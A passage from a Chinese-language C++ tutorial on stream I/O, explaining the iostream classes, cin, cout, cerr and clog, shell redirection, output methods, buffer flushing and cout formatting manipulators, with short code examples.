title="17.1.2 流、缓冲区和 iostream 文件"></a>17.1.2 流、缓冲区和 iostream 文件</h3><p>C++ 的 I/O 功能主要定义在 <code>&lt;iostream&gt;</code> 头文件中（以及其他相关头文件如 <code>&lt;fstream&gt;</code>, <code>&lt;sstream&gt;</code>）。<code>&lt;iostream&gt;</code> 定义了一系列用于处理流的类和对象。</p><p><strong>核心 I/O 类库:</strong></p><ul><li>  <strong><code>ios_base</code>:</strong> 提供了与流无关的基本属性和方法（如格式化标志、流状态）。</li><li>  <strong><code>ios</code>:</strong> 基于 <code>ios_base</code>，增加了与具体字符类型相关的错误状态信息。</li><li>  <strong><code>ostream</code>:</strong> 基于 <code>ios</code>，提供了<strong>输出流</strong>的功能（如 <code>operator&lt;&lt;</code>, <code>put()</code>, <code>write()</code>）。</li><li>  <strong><code>istream</code>:</strong> 基于 <code>ios</code>，提供了<strong>输入流</strong>的功能（如 <code>operator&gt;&gt;</code>, <code>get()</code>, <code>getline()</code>, <code>read()</code>）。</li><li>  <strong><code>iostream</code>:</strong> 同时继承自 <code>istream</code> 和 <code>ostream</code>，支持输入和输出操作。</li></ul><p><strong>标准流对象:</strong> <code>&lt;iostream&gt;</code> 还定义了几个预定义的全局流对象，用于处理标准输入和输出：</p><ul><li>  <strong><code>cin</code> (console input):</strong> <code>istream</code> 类的对象，通常连接到<strong>标准输入设备</strong>（键盘）。</li><li>  <strong><code>cout</code> (console output):</strong> <code>ostream</code> 类的对象，通常连接到<strong>标准输出设备</strong>（屏幕）。它通常是<strong>行缓冲</strong>的。</li><li>  <strong><code>cerr</code> (console error):</strong> <code>ostream</code> 类的对象，通常连接到<strong>标准错误设备</strong>（屏幕）。它通常是<strong>无缓冲</strong>的，用于立即显示错误消息。</li><li>  <strong><code>clog</code> (console log):</strong> <code>ostream</code> 类的对象，也通常连接到标准错误设备。但它通常是<strong>缓冲</strong>的。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 包含 iostream 以使用 cin, cout, cerr, clog</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>; <span class="comment">// 使用 cout 输出提示信息到标准输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;                 <span class="comment">// 使用 cin 从标准输入读取整数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Age cannot be negative.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 cerr 输出错误信息到标准错误</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">clog</span> &lt;&lt; <span class="string">&quot;Log: Invalid age entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 使用 clog 输出日志信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出结果到标准输出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些标准流对象使得基本的控制台 I/O 非常方便。</p><h3 id="17-1-3-重定向"><a href="#17-1-3-重定向" class="headerlink" title="17.1.3 重定向"></a>17.1.3 重定向</h3><p>许多操作系统（如 Linux, macOS, Windows）支持<strong>I/O 重定向 (Redirection)**。重定向允许你改变程序的标准输入来源和标准输出/标准错误的目的地，而</strong>无需修改程序代码**。</p><ul><li><p><strong>输出重定向 (<code>&gt;</code>):</strong> 将程序的标准输出（<code>cout</code> 的内容）发送到指定文件，而不是屏幕。如果文件已存在，通常会覆盖它。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./my_program &gt; output.txt</span><br></pre></td></tr></table></figure><p>  执行 <code>my_program</code>，其 <code>cout</code> 输出的内容将写入 <code>output.txt</code> 文件。</p></li><li><p><strong>输出重定向（追加 <code>&gt;&gt;</code>):</strong> 将程序的标准输出追加到指定文件的末尾。如果文件不存在，则创建它。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./my_program &gt;&gt; output.txt</span><br></pre></td></tr></table></figure></li><li><p><strong>输入重定向 (<code>&lt;</code>):</strong> 使程序从指定文件读取其标准输入（<code>cin</code> 的内容），而不是从键盘。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./my_program &lt; input.txt</span><br></pre></td></tr></table></figure><p>  <code>my_program</code> 会从 <code>input.txt</code> 文件中读取它期望通过 <code>cin</code> 获得的数据。</p></li><li><p><strong>错误重定向:</strong> 重定向标准错误 (<code>cerr</code>, <code>clog</code>) 的方式因 shell 而异。</p><ul><li><strong>bash/sh/zsh:</strong> 使用 <code>2&gt;</code> (覆盖) 或 <code>2&gt;&gt;</code> (追加)。  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./my_program 2&gt; error.log          <span class="comment"># 重定向 stderr 到 error.log</span></span><br><span class="line">./my_program &gt; output.txt 2&gt; error.log <span class="comment"># 重定向 stdout 和 stderr</span></span><br><span class="line">./my_program &gt; combined.log 2&gt;&amp;1   <span class="comment"># 将 stderr 重定向到 stdout，然后一起重定向到文件</span></span><br></pre></td></tr></table></figure></li><li>  <strong>Windows (cmd.exe):</strong> 类似地使用 <code>2&gt;</code> 和 <code>2&gt;&gt;</code>。</li></ul></li></ul><p>重定向是一个强大的工具，它允许我们将程序的输入和输出与文件连接起来，方便进行测试、日志记录和数据处理，而无需修改程序本身来处理文件 I/O。程序仍然使用 <code>cin</code>, <code>cout</code>, <code>cerr</code>，但操作系统负责将这些标准流连接到文件。</p><h2 id="17-2-使用-cout-进行输出"><a href="#17-2-使用-cout-进行输出" class="headerlink" title="17.2 使用 cout 进行输出"></a>17.2 使用 cout 进行输出</h2><p><code>std::cout</code> 是 C++ 标准库 <code>&lt;iostream&gt;</code> 中预定义的一个 <code>ostream</code> 类的全局对象，通常连接到标准输出设备（如屏幕）。它是 C++ 中最常用的输出工具。</p><h3 id="17-2-1-重载的-lt-lt-运算符"><a href="#17-2-1-重载的-lt-lt-运算符" class="headerlink" title="17.2.1 重载的 &lt;&lt; 运算符"></a>17.2.1 重载的 &lt;&lt; 运算符</h3><p><code>cout</code> 最常见的用法是配合<strong>插入运算符 (<code>&lt;&lt;</code>)</strong> 使用。这个运算符被<strong>重载 (overloaded)</strong> 以接受 C++ 中所有的基本数据类型（如 <code>int</code>, <code>float</code>, <code>double</code>, <code>char</code>, 指针类型）以及一些库类型（如 <code>std::string</code>, C 风格字符串 <code>const char*</code>）。</p><p><strong>工作原理:</strong></p><ul><li>  <code>cout &lt;&lt; value;</code> 表达式的值是 <code>cout</code> 对象本身 (<code>ostream&amp;</code>)。</li><li>  这使得可以<strong>链接 (chain)</strong> 多个插入运算符：<code>cout &lt;&lt; &quot;Value: &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y;</code>。这会被解释为 <code>((cout &lt;&lt; &quot;Value: &quot;) &lt;&lt; x) &lt;&lt; &quot; and &quot;) &lt;&lt; y;</code>。</li><li>  <code>&lt;&lt;</code> 运算符会根据 <code>value</code> 的类型，将其转换为适当的字符表示形式，并发送到输出流（通常先到缓冲区）。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">65.5</span>;</span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name = <span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> city = <span class="string">&quot;New York&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Basic Output ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// endl 插入换行符并刷新缓冲区</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City: &quot;</span> &lt;&lt; city &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 链接输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Chained Output ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; (&quot;</span> &lt;&lt; initial &lt;&lt; <span class="string">&quot;), age &quot;</span> &lt;&lt; age</span><br><span class="line">              &lt;&lt; <span class="string">&quot;, lives in &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出指针地址 (通常以十六进制显示)</span></span><br><span class="line">    <span class="keyword">int</span>* ptr_age = &amp;age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAddress of age: &quot;</span> &lt;&lt; ptr_age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于用户自定义的类类型，如果想让 <code>cout &lt;&lt; myObject;</code> 能够工作，需要为该类重载 <code>operator&lt;&lt;</code>（通常作为友元函数），如第 11 章所述。</p><h3 id="17-2-2-其他-ostream-方法"><a href="#17-2-2-其他-ostream-方法" class="headerlink" title="17.2.2 其他 ostream 方法"></a>17.2.2 其他 ostream 方法</h3><p>除了 <code>&lt;&lt;</code> 运算符，<code>ostream</code> 类（<code>cout</code> 是其对象）还提供了其他输出方法：</p><ul><li><p><strong><code>put(char c)</code>:</strong> 输出<strong>单个字符</strong> <code>c</code>。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="string">&#x27;H&#x27;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="string">&#x27;!&#x27;</span>).put(<span class="string">&#x27;\n&#x27;</span>); <span class="comment">// put() 也返回 ostream&amp;，可以链接</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>write(const char* s, streamsize n)</code>:</strong> 输出从地址 <code>s</code> 开始的<strong>内存块</strong>中的 <code>n</code> 个字节。它<strong>不会</strong>在遇到空字符 <code>\0</code> 时停止，而是精确地写入 <code>n</code> 个字节。这对于输出二进制数据或非空字符结尾的字符数组很有用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* message = <span class="string">&quot;Binary Data&quot;</span>;</span><br><span class="line"><span class="comment">// 输出前 6 个字节 &quot;Binary&quot;</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.write(message, <span class="number">6</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buffer[] = &#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line"><span class="comment">// 输出整个 buffer 的 5 个字节，包括空字符</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.write(buffer, <span class="keyword">sizeof</span>(buffer)) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="17-2-3-刷新输出缓冲区"><a href="#17-2-3-刷新输出缓冲区" class="headerlink" title="17.2.3 刷新输出缓冲区"></a>17.2.3 刷新输出缓冲区</h3><p>如前所述，输出通常是缓冲的。有时我们需要确保缓冲区中的内容立即被发送到输出设备，这称为<strong>刷新 (Flushing)</strong> 缓冲区。</p><p>有几种方法可以刷新 <code>cout</code> 的缓冲区：</p><ol><li><p><strong><code>std::endl</code> (Manipulator):</strong> 这是最常用的方法。<code>endl</code> 不仅向流中插入一个<strong>换行符 (<code>\n</code>)**，还会</strong>显式刷新**输出缓冲区。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Line 1&quot;，换行，并刷新</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>std::flush</code> (Manipulator):</strong> <strong>只刷新</strong>输出缓冲区，<strong>不插入</strong>任何字符。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::flush; <span class="comment">// 立即显示 &quot;Processing...&quot;，不换行</span></span><br><span class="line"><span class="comment">// ...长时间操作...</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Done.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>std::ends</code> (Manipulator):</strong> 向流中插入一个<strong>空字符 (<code>\0</code>)**，然后</strong>刷新**缓冲区。这在与其他需要空字符结尾字符串的系统交互时可能有用，但不太常见。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Null terminated&quot;</span> &lt;&lt; <span class="built_in">std</span>::ends;</span><br></pre></td></tr></table></figure></li><li><p> <strong>程序正常结束:</strong> 当 <code>main</code> 函数返回或调用 <code>exit()</code> 时，通常会自动刷新所有打开的输出流。</p></li><li><p> <strong>缓冲区满:</strong> 当缓冲区满时会自动刷新。</p></li><li><p> <strong>与输入关联:</strong> 当 <code>cin</code> 需要从用户那里读取数据，并且 <code>cout</code> 的缓冲区中有待输出的内容时，通常会先刷新 <code>cout</code> 的缓冲区（以确保提示信息先显示出来）。</p></li></ol><p><strong><code>endl</code> vs. <code>&#39;\n&#39;</code>:</strong></p><ul><li>  <code>cout &lt;&lt; endl;</code> 等价于 <code>cout &lt;&lt; &#39;\n&#39; &lt;&lt; flush;</code></li><li>  <code>cout &lt;&lt; &#39;\n&#39;;</code> 只插入换行符，<strong>不保证</strong>立即刷新缓冲区（除非流是行缓冲且连接到终端）。</li></ul><p>在性能敏感的代码中（例如大量循环输出），频繁使用 <code>endl</code> 可能会因为不必要的刷新而降低效率。在这种情况下，如果不需要每次都立即看到输出，可以只使用 <code>&#39;\n&#39;</code>，让缓冲区在更合适的时机（如缓冲区满或程序结束）刷新。</p><h3 id="17-2-4-用-cout-进行格式化"><a href="#17-2-4-用-cout-进行格式化" class="headerlink" title="17.2.4 用 cout 进行格式化"></a>17.2.4 用 cout 进行格式化</h3><p>默认情况下，<code>cout</code> 会根据数据的类型选择一种“合理”的格式进行输出。但我们可以通过多种方式控制输出的格式，例如字段宽度、小数位数、对齐方式、数字基数等。</p><p>格式化可以通过以下方式设置：</p><ul><li>  <strong><code>ios_base</code> 成员函数:</strong> <code>ios_base</code> 类（<code>ostream</code> 的基类）提供了一些成员函数来设置格式标志。</li><li>  <strong>操纵符 (Manipulators):</strong> 定义在 <code>&lt;iostream&gt;</code> 和 <code>&lt;iomanip&gt;</code> 中的特殊函数，可以像插入值一样插入到 <code>cout</code> 语句中来改变流的状态。使用操纵符通常更方便。</li></ul><h4 id="1-修改数值的基数-dec-hex-oct"><a href="#1-修改数值的基数-dec-hex-oct" class="headerlink" title="1. 修改数值的基数 (dec, hex, oct)"></a>1. 修改数值的基数 (<code>dec</code>, <code>hex</code>, <code>oct</code>)</h4><p>可以使用操纵符 <code>dec</code>, <code>hex</code>, <code>oct</code> 来改变整数输出的基数（默认为十进制 <code>dec</code>）。这些设置是<strong>粘性 (sticky)</strong> 的，即一旦设置，后续所有整数输出都会采用该基数，直到被重新设置为止。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">255</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default (decimal): &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 255</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::hex; <span class="comment">// 设置为十六进制</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hexadecimal: &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 ff</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::oct; <span class="comment">// 设置为八进制</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal: &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 377</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::dec; <span class="comment">// 恢复为十进制</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decimal again: &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 255</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配合 showbase 和 uppercase</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::showbase &lt;&lt; <span class="built_in">std</span>::uppercase; <span class="comment">// 显示基数前缀并使用大写字母</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hex with base and uppercase: &quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0XFF</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal with base: &quot;</span> &lt;&lt; <span class="built_in">std</span>::oct &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0377</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noshowbase &lt;&lt; <span class="built_in">std</span>::nouppercase &lt;&lt; <span class="built_in">std</span>::dec; <span class="comment">// 恢复默认</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>showbase</code>: 显示数值基数的前缀（<code>0x</code> 或 <code>0X</code> 表示十六进制，<code>0</code> 表示八进制）。</li><li>  <code>noshowbase</code>: 不显示基数前缀（默认）。</li><li>  <code>uppercase</code>: 十六进制输出时使用大写字母 <code>A-F</code> 和 <code>X</code>。</li><li>  <code>nouppercase</code>: 使用小写字母（默认）。</li></ul><h4 id="2-调整字段宽度-width-setw"><a href="#2-调整字段宽度-width-setw" class="headerlink" title="2. 调整字段宽度 (width(), setw())"></a>2. 调整字段宽度 (<code>width()</code>, <code>setw()</code>)</h4><p>可以指定输出下一个值时使用的<strong>最小字段宽度</strong>。如果值的实际宽度小于指定宽度，则用填充字符（默认为空格）填充。</p><ul><li>  <strong><code>cout.width(int w)</code> (成员函数):</strong> 设置下一次输出的最小宽度为 <code>w</code>。<strong>只对紧随其后的下一次输出有效</strong>，之后会自动恢复默认（宽度为 0）。</li><li>  <strong><code>setw(int w)</code> (操纵符, <code>&lt;iomanip&gt;</code>):</strong> 与 <code>width()</code> 效果相同，也是<strong>只对下一次输出有效</strong>。使用 <code>setw</code> 通常更方便。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setw</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> val = <span class="number">12.3</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 *12.3*</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.width(<span class="number">10</span>); <span class="comment">// 设置宽度为 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 *      12.3* (右对齐)</span></span><br><span class="line">    <span class="comment">// 宽度设置失效</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 *12.3*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 setw</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; <span class="string">&quot;Hi&quot;</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 输出 *      12.3*   Hi*</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-填充字符-fill"><a href="#3-填充字符-fill" class="headerlink" title="3. 填充字符 (fill())"></a>3. 填充字符 (<code>fill()</code>)</h4><p>当字段宽度大于值的实际宽度时，用于填充空白区域的字符可以通过 <code>fill()</code> 成员函数或 <code>setfill()</code> 操纵符设置。这个设置是<strong>粘性</strong>的。</p><ul><li>  <strong><code>cout.fill(char ch)</code> (成员函数):</strong> 设置填充字符为 <code>ch</code>。返回之前的填充字符。</li><li>  <strong><code>setfill(char ch)</code> (操纵符, <code>&lt;iomanip&gt;</code>):</strong> 设置填充字符为 <code>ch</code>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setw, setfill</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">42</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default fill: *&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">6</span>) &lt;&lt; num &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span 